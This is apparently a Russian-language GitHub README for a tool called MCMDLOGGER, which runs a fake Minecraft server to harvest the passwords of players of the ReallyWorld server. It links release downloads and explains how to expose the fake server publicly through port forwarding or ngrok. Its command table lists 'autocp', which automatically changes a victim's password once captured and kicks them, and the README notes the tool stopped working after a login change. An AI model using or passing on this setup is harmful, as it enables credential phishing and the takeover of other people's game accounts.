# Поддержка прекращена на неопределенный срок
ReallyWorld обновил свою форму входа, что означает что этот инструмент более не актуален. Инструменты, которые использовались для работы этого логгера прекратили свою поддержку. Без них невозможно продолжать дальнейшее обновление этого инструмента.

# MCMDLOGGER FOR REALLYWORLD
<p align="center">
  <a href="https://github.com/tobyaddroc/minecrafters-need-food/releases/"><img src="https://img.shields.io/github/downloads/tobyaddroc/minecrafters-need-food/total.svg" alt="GitHub All Releases"/></a>
</p>

<p align="center">
  <a href="#MCMDLOGGER"><img src="https://badgen.net/static/MC/1.12.2/green" alt="Minecraft"/></a>
  <a href="#MCMDLOGGER"><img src="https://badgen.net/static/MC/1.16.5/green" alt="Minecraft"/></a>
</p>
<p align="center">
<a href="https://travis-ci.com/tobyaddroc/minecrafters-need-food/"><img src="https://travis-ci.com/tobyaddroc/minecrafters-need-food.svg?branch=main" alt="Build Status"/></a>
<a href="https://github.com/tobyaddroc/minecrafters-need-food/releases/"><img src="https://img.shields.io/github/release/tobyaddroc/minecrafters-need-food.svg" alt="Release"/></a>
<a href="https://github.com/tobyaddroc/minecrafters-need-food/releases/"><img src="https://badgen.net/static/status/beta/orange" alt="Release"/></a>
</p>

**ВНИМАНИЕ!** Не создавайте бессмысленные репорты о багах во вкладке [Issues](https://github.com/tobyaddroc/minecrafters-need-food/issues), я навсегда забаню вас в системе отслеживания багов, в том числе "баг" при котором нельзя выбрать другой сервер кроме ReallyWorld.
```
                           █▀▄▀█ █▀▀ █▀▄▀█ █▀▄ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
                           █ ▀ █ █▄▄ █ ▀ █ █▄▀ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄
```
## Как использовать
1. [Скачайте](https://github.com/tobyaddroc/minecrafters-need-food/releases) ту версию, которая вам нужна, будь то отладочная или релизная, под свою операционную систему
2. Запустите логгер, введите порт, на котором будет поднят фейковый сервер. [**P.S** Если у вас крашит логгер после ввода порта, убедитесь то что порт который вы указываете не занят чем-то еще, или попробуйте открыть логгер от имени администратора. Если все эти способы вам не помогли, то введите другой порт]
3. Пробросьте порты
4. Используйте команды
## Команды
| Название | Описание | Аргументы |
|--|--|--|
| <center>help</center> | <center>Отображает список команд и описание к ним/отображает подробное описание команды</center> | <center>[Команда]</center>
|<center>list</center>|<center>Отображает список подключенных к серверу игроков</center>|<center>Отсутствуют</center>|
|<center>kick</center>|<center>Принудительно отключает игрока от сервера</center>|<center><Ник> [Причина]</center>
|<center>autocp</center>|<center>Если игрок ввел правильный пароль, автоматически меняет его на случайный и кикает с сервера</center>|<center>Отсутствуют</center>|
|<center>ngrok</center>|<center>Открытие портов при помощи ngrok</center>|<center><b>...</b></center>|
|<center>stop</center>|<center>Остановить сервер и освободить порт</center>|<center>Отсутствуют</center>|

Команды, выделенные <таким образом>, означают то что аргумент обязателен<br>
Команды, выделенные [таким образом], означают то что аргумент не обязателен<br>
Подобнее с аргументами команды "ngrok" вы можете ознакомиться ниже<br>

## ngrok
Ngrok используется для открытия портов и получением сервером своего выделенного IP адреса. Вы можете открыть порты и без использования сторонних сервисов, но только ограниченный круг провайдеров по России предоставляет эту возможность бесплатно.<br>
Для использования ngrok вместе с mcmdlogger, выполните следующие действия:
1. Зарегистрируйтесь в [ngrok](https://dashboard.ngrok.com/signup)
2. Получите ваш уникальный API-ключ [здесь](https://dashboard.ngrok.com/get-started/setup)
3. Запустите сервер в mcmdlogger и введите по очереди следующие команды:
```
ngrok setup <ВАШ ТОКЕН>
ngrok region eu
ngrok start
```
В ответ вы получите 2 IP-адреса, которые будут публично вести к вашему логгеру<br>
**P.S** Если по какой-то причине у вас закрывается логгер после этих команд, то возможно при регистрации вы забыли подтвердить почту, зайдите на почту и найдите письмо от ngrok, пройдите по ссылке из письма и попробуйте еще раз. Если письма нет - запросите его заново.<br>
**P.S.S** С обновлением v0.2 ваш токен и регион сохраняются в файле ngrok.json, и у вас больше нет необходимости писать токен и регион каждый раз при включении логгера

## Спасибо
@Rikonardo как одному из создателей логгера<br>
@HastG9 за предоставление своей реализации некоторых функций и ядра логгера<br>
@GEAMER007 за помощь в процессе разработки<br>
https://www.youtube.com/watch?v=TD5Qjssu2MM
